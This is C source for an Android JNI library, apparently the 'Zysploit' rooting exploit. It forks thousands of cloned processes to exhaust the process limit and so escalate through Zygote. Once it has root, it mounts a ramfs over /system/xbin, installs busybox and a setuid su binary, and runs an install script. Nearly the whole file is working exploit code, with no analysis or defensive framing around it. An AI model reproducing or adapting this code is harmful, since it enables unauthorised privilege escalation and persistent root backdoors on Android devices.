#define GNU_SOURCE
#include "jni.h"
#include <stdio.h>
#include <errno.h>
#include <limits.h>
#include <sched.h>
#include <sys/resource.h>
#include <stdlib.h>
#include <android/log.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#define LOG_TAG "Zysploit"
#define LOGI(...) do { __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__); } while(0)

#define MAX_BABBIES 4096

unsigned int stacks[MAX_BABBIES*1024];

static char *rooted = "/data/data/com.intercept.root/files/rooted";
static char *filesdir = "/data/data/com.intercept.root/files";
static char *install = "/data/data/com.intercept.root/files/install.sh";
static char *temp = "/data/data/com.intercept.root/files/tempRoot";

void _child(void *arg)
{
	while(1)
		sleep(36400);
}

jint JNI_OnLoad(JavaVM* vm, void* reserved) {
	jint result = JNI_VERSION_1_4;
	main();
	return result;
}

int main(int argc, char **argv)
{
	struct rlimit rlim;
	int nbabbies, i;
	int babbies[4096];
	unlink(rooted);
	
	setlinebuf(stdout);
	LOGI("Zysploit by Unrevoked");
	LOGI("FUBARed by Spaztecho");
	
	if (getuid() == 0) {
		chmod(filesdir, 0777);
		chmod(install, 0755);
		LOGI("Root now with extra FUBAR");
		setgid(0);
		setuid(0);
		struct stat st;
		if (stat(temp, &st) == 0) {
			system("mkdir /data/data/com.intercept.root/files/xbin");
			system("mount -o bind /system/xbin /data/data/com.intercept.root/files/xbin");
			system("mount -t ramfs ramfs /system/xbin");
			chmod("/system/xbin", 0755);
			system("cat /data/data/com.intercept.root/files/busybox > /system/xbin/busybox");
			chmod("/system/xbin/busybox", 04755);
			system("busybox cp -rp /data/data/com.intercept.root/files/xbin/* /system/xbin/");
			unlink("/system/xbin/su");
			system("cat /data/data/com.intercept.root/files/su > /system/xbin/su");
			chmod("/system/xbin/su", 04755);
			system("mount -o bind /system/xbin/su /system/bin/su");
			system("umount /data/data/com.intercept.root/files/xbin");
			system("rmdir /data/data/com.intercept.root/files/xbin");
			FILE *File=fopen(rooted,"w+");
		} else {
			FILE *File=fopen(rooted,"w+");
			execlp("/data/data/com.intercept.root/files/install.sh", "/data/data/com.intercept.root/files/install.sh", (char *)NULL);
		}
		return 0;
	}
	
	if (getrlimit(RLIMIT_NPROC, &rlim) < 0) {
		printf("Egetrlimit failed: errno %d\n", errno);
		return 1;
	}
	printf("Lrlim.rlim_cur = %d, rlim.rlim_max = %d\n", rlim.rlim_cur, rlim.rlim_max);
	
	LOGI("Making babbies");
	for (nbabbies = 0; nbabbies < MAX_BABBIES; nbabbies++) {
		babbies[nbabbies] = clone(_child, stacks+(nbabbies+1)*1024, CLONE_VM, NULL);
		if (babbies[nbabbies] < 0)
			break;
		if ((nbabbies % 500) == 0)
			printf("L...%d...\n", nbabbies);
	}
	printf("Lcloned %d babbies; waiting for remote\n", nbabbies);
	printf("S\n");

	
	/* Sooner or later, the other end will tell us to proceed. */
	read(0, &i, 1);
	printf("Lremote acknowledged... waiting for ActivityManager\n");

	/* Sometimes ActivityManager waits to spawn a process even after
	 * it's told us that it started the service.  We'll give it a second
	 * to get its shit together.  Evade, don't solve, concurrency problems.
	 *
	 * (This could actually be 'solved' reliably by repeatedly walking
	 * the process table looking for the one we want, but a second
	 * really is an eternity.  Still, that wouldn't be blocking,
	 * either...)
	 */
	sleep(10);
	
	LOGI("killing off babbies");
	
	for (i = 0; i < nbabbies; i++) {
		kill(babbies[i], 9);
	}
	LOGI("all babbies killed");
	return 0;
}


